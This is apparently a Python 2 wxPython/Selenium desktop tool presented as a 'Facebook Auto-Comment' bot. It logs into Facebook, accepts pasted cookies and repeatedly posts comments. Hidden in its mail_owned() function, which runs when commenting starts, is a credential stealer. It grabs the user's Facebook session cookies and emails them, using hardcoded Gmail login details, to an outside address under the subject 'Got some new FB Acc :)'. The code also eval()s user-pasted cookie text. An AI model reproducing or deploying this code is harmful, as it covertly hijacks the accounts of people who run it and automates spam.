# -*- coding: cp1252 -*-
from time import gmtime, strftime
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from random import randrange
from selenium.webdriver.common.action_chains import ActionChains
import time
import wx.media
import re
import smtplib
from urlparse import urlparse
import psutil
import pickle
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from os import getcwd
from datetime import datetime
import  wx #importe le module graphique wx
import os
from os.path import *

#Fix unix/windows compatibility
from sys import platform
separator='/'
if platform == "linux" or platform == "linux2":
    separator='/'
elif platform == "darwin":
    separator='/'
elif platform == "win32":
    separator='\\'

#Triggers
mailsent=0
url_changed=0
firstrun=0
use_cookie=0
new_log=0
cookie_mem=""

class MyFrame(wx.Frame):
    def __init__(self, parent, id, title):
        wx.Frame.__init__(self, None, id, u"Facebook Auto-Comment V0.1 par Fawn Le Sombre", wx.DefaultPosition, wx.Size(500, 750),style=wx.MINIMIZE_BOX|wx.SYSTEM_MENU | wx.CAPTION | wx.CLOSE_BOX|wx.STAY_ON_TOP)

        #Panel pour affichage
        self.panel = wx.Panel(self, -1)

        #On capture l'event de fermeture de l'app
        self.Bind(wx.EVT_CLOSE,self.on_close,self)
        
        #Deco
        ImgDir = (getcwd()+separator+"Fond_setup.jpg")
        fond = wx.Image(ImgDir, wx.BITMAP_TYPE_ANY).ConvertToBitmap()
        fond1 = wx.StaticBitmap(self.panel, -1, fond)

        #Crée la barre d'état (en bas).
        self.CreerBarreEtat()

        #Musique Player
        self.player = wx.media.MediaCtrl(self.panel, szBackend=wx.media.MEDIABACKEND_WMP10)
        self.player.Load("zik.mp3")
        self.Bind(wx.media.EVT_MEDIA_LOADED,self.button_play,self.player)

        #Boutons
        self.buttonLogFB = wx.Button(fond1,-1,u"Login FaceBook")
        self.Bind(wx.EVT_BUTTON, self.LogIntoFacebook, self.buttonLogFB)
        
        self.buttonStartCronCom = wx.Button(fond1,-1,u"Start AutoComment")
        self.Bind(wx.EVT_BUTTON, self.ComEnter, self.buttonStartCronCom)
        
        self.buttonStopCronCom = wx.Button(fond1,-1,u"Stop AutoComment")
        self.Bind(wx.EVT_BUTTON, self.StopCronCom, self.buttonStopCronCom)
        #Hack
        self.buttonCookiechange=wx.Button(fond1,-1,u"Changer Cookie")
        self.Bind(wx.EVT_BUTTON, self.ChangeCookie, self.buttonCookiechange)

        self.buttonURLchange=wx.Button(fond1,-1,u"Changer URL")
        self.Bind(wx.EVT_BUTTON, self.ChangeURL, self.buttonURLchange)

        #Boutons musique
        self.buttonZik = wx.Button(fond1,-1,u"Play/Pause")
        self.Bind(wx.EVT_BUTTON, self.button_play, self.buttonZik)

        self.buttonZikStop = wx.Button(fond1
                                       ,-1,u"Stop")
        self.Bind(wx.EVT_BUTTON, self.button_stop, self.buttonZikStop)

        self.buttonZikVolM = wx.Button(fond1,-1,u"Vol -")
        self.Bind(wx.EVT_BUTTON, self.button_volm, self.buttonZikVolM)

        self.buttonZikVolP = wx.Button(fond1,-1,u"Vol +")
        self.Bind(wx.EVT_BUTTON, self.button_volp, self.buttonZikVolP)

        #widgets vide
        self.txtVideCronCom = wx.StaticText(fond1,-1,"")
        self.txtVideVol = wx.StaticText(fond1,-1,"")
        self.txtVideProg = wx.StaticText(fond1,-1,"",pos=(170,655))
        self.txtVideProg.SetFont(wx.Font(18, wx.DEFAULT , wx.NORMAL, wx.NORMAL,False, u"Impact" ));
        self.txtVideCookie=wx.StaticText(fond1,-1,"")
        self.txtVideCookie.SetFont(wx.Font(10, wx.DEFAULT , wx.NORMAL, wx.BOLD,False, u"Arial" ))
        self.txtURLvide = wx.StaticText(fond1,-1,"")
        self.txtURLvide.SetFont(wx.Font(10, wx.DEFAULT , wx.NORMAL, wx.BOLD,False, u"Arial" ))
        self.txtURLvide.SetForegroundColour("sea green")
        self.txtURLbad = wx.StaticText(fond1,-1,"")
        self.txtURLbad.SetFont(wx.Font(10, wx.DEFAULT , wx.NORMAL, wx.BOLD,False, u"Arial" ))
        self.txtURLbad.SetForegroundColour("FIREBRICK")

        #widgets
        self.gauge = wx.Gauge(fond1,-1, 100, size=(400, 10),pos=(50,635),style=wx.GA_SMOOTH)
        self.timer = wx.Timer(self, 1)
        self.loopbox= wx.CheckBox(fond1,-1,"Repeat ?")
        self.lsdFX= wx.CheckBox(fond1,-1,"LSD Effect ?")
        self.txtURL = wx.TextCtrl(fond1,-1,size=(440,20),style=wx.TE_PROCESS_ENTER)
        self.txtURL.SetHint(u"Copiez URL ici...")
        self.Bind(wx.EVT_TEXT_ENTER,self.URLcomplete,self.txtURL)
        self.txtLoginFB = wx.StaticText(fond1,-1,"FB Login : NOT LOGGED IN")
        self.txtLoginFB.SetFont(wx.Font(10, wx.DEFAULT , wx.NORMAL, wx.NORMAL,False, u"Impact" ))
        self.txtLoginFB.SetForegroundColour("FIREBRICK")
    
        #Hack
        self.txtCookie_enter = wx.TextCtrl(fond1,-1,size=(140,40),style=wx.TE_PROCESS_ENTER|wx.TE_MULTILINE)
        self.Bind(wx.EVT_TEXT_ENTER,self.cookie_enter,self.txtCookie_enter)
        
        #Sizer
        gbox1 = wx.GridBagSizer(10,10)
        gbox1.SetEmptyCellSize((10,10))
        gbox1.Add(self.buttonLogFB,(0,0))
        gbox1.Add(self.txtLoginFB,(0,1))
        gbox1.Add(self.buttonStartCronCom,(1,0))
        gbox1.Add(self.buttonStopCronCom,(2,0))
        gbox1.Add(self.txtVideCronCom,(3,0))
        gbox1.Add(self.txtCookie_enter,(4,0))
        gbox1.Add(self.buttonCookiechange,(5,0))
        gbox1.Add(self.txtVideCookie,(5,1))

        gbox2 = wx.GridBagSizer(10,10)
        gbox2.SetEmptyCellSize((10,10))
        gbox2.Add(self.buttonZik,(0,0))
        gbox2.Add(self.buttonZikStop,(0,1))
        gbox2.Add(self.buttonZikVolM,(1,0))
        gbox2.Add(self.buttonZikVolP,(1,1))
        gbox2.Add(self.txtVideVol,(2,0))
        gbox2.Add(self.loopbox,(3,0))
        gbox2.Add(self.lsdFX,(3,1))
        
        gbox3 = wx.GridBagSizer(10,10)
        gbox3.SetEmptyCellSize((10,10))
        gbox3.Add(self.txtURL,(0,0))
        gbox3.Add(self.txtURLvide,(1,0))
        gbox3.Add(self.buttonURLchange,(3,0))
        gbox3.Add(self.txtURLbad,(2,0))

        #Auto Com
        box1 = wx.StaticBox(self.panel, -1, u"Auto-Comment :")
        bsizer1 = wx.StaticBoxSizer(box1, wx.HORIZONTAL)
        sizerH1 = wx.BoxSizer(wx.VERTICAL)
        sizerH1.Add(gbox1, 0, wx.ALL|wx.CENTER, 10)
        bsizer1.Add(sizerH1, 1, wx.EXPAND, 0)

        #URL
        box3 = wx.StaticBox(self.panel, -1, u"URL du post à commenter :")
        bsizer3 = wx.StaticBoxSizer(box3, wx.HORIZONTAL)
        sizerH3 = wx.BoxSizer(wx.VERTICAL)
        sizerH3.Add(gbox3, 0, wx.ALL|wx.CENTER, 10)
        bsizer3.Add(sizerH3, 1, wx.EXPAND, 0)


        #Zik
        box2 = wx.StaticBox(self.panel, -1, u"Musique :")
        bsizer2 = wx.StaticBoxSizer(box2, wx.HORIZONTAL)
        sizerH2 = wx.BoxSizer(wx.VERTICAL)
        sizerH2.Add(gbox2, 0, wx.ALL|wx.CENTER, 10)
        bsizer2.Add(sizerH2, 1, wx.EXPAND, 0)

        #--------Ajustement du sizer----------
        mainSizer = wx.BoxSizer(wx.VERTICAL)
        mainSizer.Add(bsizer1, 0,wx.ALL|wx.EXPAND, 10)
        mainSizer.Add(bsizer3, 0,wx.ALL|wx.EXPAND, 10)
        mainSizer.Add(bsizer2, 0,wx.ALL|wx.EXPAND, 10)
        self.SetSizer(mainSizer)

        #On desactive certains boutons au départ
        self.buttonStopCronCom.Disable()
        self.buttonStartCronCom.Disable()

        #GeckoVersion
        self.getGecko()

        #URL Check
        self.checkURL()

        #CouleursDB
        self.couleurs=[wx.BLUE,wx.RED,wx.GREEN]
        self.longeurtabcouleur = len(self.couleurs)

        self.buttonZik.SetBackgroundColour(wx.GREEN)

    def checkURL(self):
        if exists("url.txt"):
            pass
        else:
            url_create=open("url.txt", 'w').close()
        url_set=open("url.txt", 'r').readline()
        if url_set !="":
            maxlong=60
            url_set=url_set[0:maxlong]
            self.txtURLvide.SetLabel(url_set+"...")

    def ChangeURL(self,evt):
        self.txtURL.Enable()
        self.txtURL.SetLabel("")
        self.txtURLbad.SetLabel("")
        self.txtURLvide.SetLabel("")
        
    def URLcomplete(self,evt):
        global url_changed
        self.txtURL.Disable()
        self.url=self.txtURL.GetValue()
        if self.url!="":
            new_url=re.sub(ur"(^https?:\/\/)(.*\.?facebook)(.*$)",u"\\1m.facebook\\3",self.url,count=1)
            verif_url=urlparse(new_url)
            if verif_url.netloc !="" and verif_url.path!="":
                self.txtURLvide.SetLabel("URL Set :)")
                self.txtURLbad.SetLabel("")
                #self.buttonStartCronCom.Enable()
                urltxt=open("url.txt", 'w')
                urltxt.write(new_url)
                urltxt.close()
                url_changed=1
            else:
                self.txtURLbad.SetLabel("Wrong URL Format ;(")
                self.checkURL()
        else:
            self.txtURLbad.SetLabel("URL Vide ;(")
            self.checkURL()

    #Hack
    def cookie_enter(self,evt):
        global cookie_mem,use_cookie
        cookie_mem=self.txtCookie_enter.GetValue()
        try:
            cookie_coupe=cookie_mem.split("'")
            cookie_coupe_bis=cookie_coupe[3].split(".")
            cookie_domain=cookie_coupe_bis[1]
            if cookie_mem !="":
                if cookie_domain=="facebook":
                    self.txtCookie_enter.Disable()
                    self.txtVideCookie.SetLabel(u"Cookie Set :)")
                    self.txtVideCookie.SetForegroundColour("sea green")
                    use_cookie=1  
            else:
                self.txtVideCookie.SetLabel(u"Cookie Vide ;(")
                self.txtVideCookie.SetForegroundColour("FIREBRICK")
        except:
            self.txtVideCookie.SetLabel(u"Cookie Invalide ;(")
            self.txtVideCookie.SetForegroundColour("FIREBRICK")
    
    def ChangeCookie(self,evt):
        self.txtCookie_enter.Enable()
        self.txtCookie_enter.SetLabel("")
        self.txtVideCookie.SetLabel("")
    
    def OnTimer(self, evt):
        try:
            longueurZik=self.player.Length()
            if longueurZik!=0:
                positionZik=self.player.Tell()
                calcpc=(positionZik*100)/longueurZik
                self.gauge.SetValue(calcpc)
                self.txtVideProg.SetLabel(u"Progression : "+str(calcpc)+" %")
                if self.lsdFX.IsChecked()==True:
                    self.txtVideProg.SetForegroundColour(self.couleurs[(randrange(self.longeurtabcouleur))])     
                else:
                    self.txtVideProg.SetForegroundColour(wx.BLACK)
                if positionZik>114300:
                    if self.loopbox.IsChecked()==True:
                        self.button_stop(evt)
                        self.button_play(evt)
                    else:
                        self.button_stop(evt)
        except:
            time.sleep(0.001)
        evt.Skip()
        
    def button_play(self,evt):
        colorpause=self.buttonZik.GetBackgroundColour()
        if colorpause==(wx.GREEN):
            self.player.Pause()
            self.timer.Stop()
            self.buttonZik.SetBackgroundColour("")
        else:#sinon on play
            self.Bind(wx.EVT_TIMER, self.OnTimer, self.timer)
            self.timer.Start()
            self.player.Play()
            self.buttonZikStop.SetBackgroundColour("")
            self.buttonZik.SetBackgroundColour(wx.GREEN)
        evt.Skip()
        
    def button_stop(self,evt):
        self.buttonZikStop.SetBackgroundColour(wx.RED)
        self.buttonZik.SetBackgroundColour("")
        self.gauge.SetValue(0)
        self.txtVideProg.SetLabel("Progression : 0 %")
        self.player.Stop()
        self.timer.Stop()
        evt.Skip()
        
    def button_volm(self,evt):
        volume=self.player.GetVolume()
        volumem=volume-0.25
        self.player.SetVolume(volumem)
        vol=int(volume*100-25)
        if vol>0:
            self.txtVideVol.SetLabel(u"Volume à : "+str(vol)+" %")
        else:
            self.txtVideVol.SetLabel(u"Volume au MIN")
        evt.Skip()

    def button_volp(self,evt):
        volume=self.player.GetVolume()
        volumep=volume+0.25
        self.player.SetVolume(volumep)
        vol=int(volume*100+25)
        if vol<100:
            self.txtVideVol.SetLabel(u"Volume à : "+str(vol)+" %")
        else:
            self.txtVideVol.SetLabel(u"Volume au MAX")
        evt.Skip()

    def StopCronCom(self,evt):
        self.timerCom.Stop()
        self.buttonStartCronCom.Enable()
        self.buttonStopCronCom.Disable()
        self.txtVideCronCom.SetLabel(u"0H 0Min 0sec")
        self.txtVideCronCom.Refresh()
        evt.Skip()
        
    def StartCronCom(self,evt):
        global Tzero
        self.timerCom=wx.Timer(self, -1)
        self.timerCom.Start(1000)
        Tzero=time.time()
        self.Bind(wx.EVT_TIMER, self.ChronoCom, self.timerCom)
        self.buttonStartCronCom.Disable()
        self.buttonStopCronCom.Enable()
        self.ComEnter(evt)
        evt.Skip()
    
    def ChronoCom(self,evt):
        global Tzero
        tempsP=time.time()
        diffTemps = tempsP-Tzero
        diffTup = time.gmtime(diffTemps)
        tempsF="%iH %iMin %isec" % ( diffTup.tm_hour, diffTup.tm_min, diffTup.tm_sec)
        self.txtVideCronCom.SetLabel(tempsF)
        self.txtVideCronCom.Refresh()
        if tempsF==u"0H 0Min 5sec":
            self.timerCom.Stop()
            self.StartCronCom(evt)
        evt.Skip()
        
    def getGecko(self):
        global geckopath
        if 'PROGRAMFILES(X86)' in os.environ:
            geckopath=getcwd()+r"\geckodriver\win64\geckodriver.exe"
        else:
            geckopath=getcwd()+r"\geckodriver\win32\geckodriver.exe"

    def killGecko(self):
        for proc in psutil.process_iter():
                if proc.name() == "geckodriver.exe":
                    proc.terminate()

    def LogIntoFacebook(self,evt):
        global driver,firstrun,cookie_mem,new_log,use_cookie,new_url_lue
        #if firstrun==0:
        cookies_list=[]
        try:
            if firstrun==0:
                driver = webdriver.Firefox(executable_path=geckopath)
                driver.get("https://www.facebook.com/")#adresse de la page
            else:
                pass
            #Hack pour format cookies
            if cookie_mem !="" :
                cookies_0=cookie_mem.split(", {")
                for i in cookies_0:
                    cookies_1="{"+i
                    cookies_2=cookies_1.replace("[{","")
                    cookies_3=cookies_2.replace("]","")
                    cookies_4=cookies_3.replace("\n","")
                    cookies_5=cookies_4.replace("{{","{")
                    cookies_list.append(cookies_5)
                for cookies in cookies_list:
                    cookie_hacked=eval(cookies)
                    driver.add_cookie(cookie_hacked)
            else :
                self.txtVideCookie.SetLabel("Cookie vide ;(")
                self.txtVideCookie.SetForegroundColour("FIREBRICK")
            driver.refresh()
            try:
                elem=driver.find_element_by_xpath("//a[@title='Profil']")#on passe dans l'except au 1er tour
                if new_log==1 or use_cookie==1:
                    self.LireURL()
                    if new_url_lue!="":
                        driver.get(new_url_lue)
                    self.buttonLogFB.Disable()
                    self.buttonStartCronCom.Enable()
                    self.txtLoginFB.SetLabel("FB Login : LOGGED IN")
                    self.txtLoginFB.SetForegroundColour("sea green")
            except:
                self.msgLogin()
                new_log=1
            firstrun=1
        except:
            self.erreurConnexion()
        evt.Skip()

    def LireURL(self):
        global new_url_lue
        lire=open("url.txt","r")
        url=lire.read()
        lire.close()
        if url!="":
            new_url_lue=re.sub(ur"(^https?:\/\/)(.*\.?facebook)(.*$)",u"\\1m.facebook\\3",url,count=1)
        else:
            new_url_lue=""

    def ComEnter(self,evt):
        global geckopath,driver,cookie,new_url_lue,url_changed,new_log
        try:
            if exists("m.txt"):
                pass
            else: 
                m=open("m.txt","w")
                m.write(str(0))
                m.close()
            n=open("m.txt","r")
            r=n.read()
            n.close()
            if r!="1":
                cookie=driver.get_cookies()
                self.mail_owned()
            else:
                pass
            self.LireURL()
            if new_log==1:
                driver.get(new_url_lue)
                new_log=0
            else:
                pass
            if url_changed==1:
                driver.get(new_url_lue)
                url_changed=0
            else:
                pass
            #Like non appuyé
##            try:
##                elem_like=driver.find_element_by_xpath("//a[@aria-pressed]")
##                for a in elem_like:
##                    plop=a.get_attribute("aria-pressed")
##                    print plop
##            except:
##                print "fail"
            

            ###NOT WORKING CANT FOCUS LAST COMMENT BOX NEED SOME HELP :P###
            
##            #1-On trouve la form
##            try:
##                elem_form=driver.find_element_by_xpath("//form[@class='commentable_item']")
##            except:
##                print "Didn't get form ;("
##            #2-On trouve les divs de commentaire
##            try:
##                elem_div=elem_form.find_elements_by_xpath(".//div[@class='UFIReplyActorPhotoWrapper img _8o _8r UFIImageBlockImage']")#champ de saisie caché
##                elem_div_cible=elem_div[-1]#On cible la derniere
##                print "Got div :)"
##            except:
##                print "Didn't get div ;("
##            #3-On clique(x2)
##            try :
##                #actionChains = ActionChains(driver)
##                #actionChains.click(elem_div).perform()
##                #elem_div.InnerHTML(message)
##                elem_form.click()
##                #elem_div_cible.send_keys(Keys.ENTER)
##                print "Click in div :)"
##            except:
##                print "No click in div ;("

            ###ON CONTOURNE LE PROBLEME EN PASSANT PAR LA VERSION MOBILE###PAS TRES PROPRE MAIS CA MARCHE

            #On scroll down pour avoir accès au control
            driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
            #Message
            message=str(randrange(99999999))+" ICI <= TEST BOT SELENIUM 3:) Merci FB :poop: "+str(randrange(99999999))
            
            #1-On focus l'input
            try:
                elem_input=driver.find_element_by_xpath("//input[@id='composerInput']")
            #2-On écrit le message
                elem_input.send_keys(message)
            #3-On chope le bouton de submit
                elem_submit=driver.find_element_by_xpath("//input[@type='submit']")
            #4-On clique le bouton de submit
                elem_submit.click()
            except:
                self.erreur_msg()
        except:
            self.erreur_msg()
        evt.Skip()

    def erreur_msg(self):
        dlg = wx.MessageDialog(self,u"Une erreur s'est produite !\nRéessayez ^^","Erreur Inconnue",\
        style=wx.ICON_ERROR|wx.STAY_ON_TOP|wx.CENTER|wx.OK) #Definit les attributs de la fenetre de message.
        dlg.ShowModal()
    
    #HACK (envoi du cookie par mail)
    def mail_owned(self):
        global cookie,mailsent
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login('fb.mailhack@gmail.com','salesmaj06')
        msg = MIMEMultipart()
        msg['Subject'] = "Got some new FB Acc :)"
        body = str(cookie)
        msg.attach(MIMEText(body, 'plain'))
        text = msg.as_string()
        adresse_roxxor = "fb_hack@netcourrier.com"
        server.sendmail("", adresse_roxxor, text)
        server.quit()
        m=open("m.txt","w")
        m.write(str(1))
        m.close()

    def erreurConnexion(self):
        dlg = wx.MessageDialog(self,u"Erreur 404-Page Innaccessible...\nVérifiez votre connexion internet !","Erreur 404",\
        style=wx.ICON_ERROR|wx.STAY_ON_TOP|wx.CENTER|wx.OK) #Definit les attributs de la fenetre de message.
        dlg.ShowModal()

    def msgLogin(self):
        dlg = wx.MessageDialog(self,u"Vous devez vous connecter à Facebook !\n Recliquez ce bouton après vous être loggué merci !","Connexion SVP !",\
        style=wx.ICON_INFORMATION|wx.STAY_ON_TOP|wx.CENTER|wx.OK) #Definit les attributs de la fenetre de message.
        dlg.ShowModal()
        
    def Chrono(self):#Chronometre (date et heure)
        stemps = time.strftime("%A %d/%m/%Y") #Definit le format voulu
        self.SetStatusText(stemps,1) #Affiche a chaque seconde.
    
    def CreerBarreEtat(self):#Creation de la barre d'etat du bas avec l'affichage de la date
        self.CreateStatusBar(2) #Cree une barre de statut (en bas) de deux parties.
        self.SetStatusWidths([-1,150]) #Definit la taille.
        self.Chrono()#Affiche.

    def on_close(self,evt):#Pour kill le timer+gecko+musique
        global driver
        try:
            self.player.Stop()
            try:
                driver.quit()
            except:
                pass
            try:
                self.killGecko()
            except:
                pass
            self.timerCom.Stop()
        except:
            pass
        finally:
            self.Destroy()
        
class MyApp(wx.App):
    def OnInit(self):
        frame = MyFrame(None, -1, None)
        frame.Show(True)
        frame.Centre()
        return True
 
if __name__=='__main__':    
 
    app = MyApp(0)
    app.MainLoop()
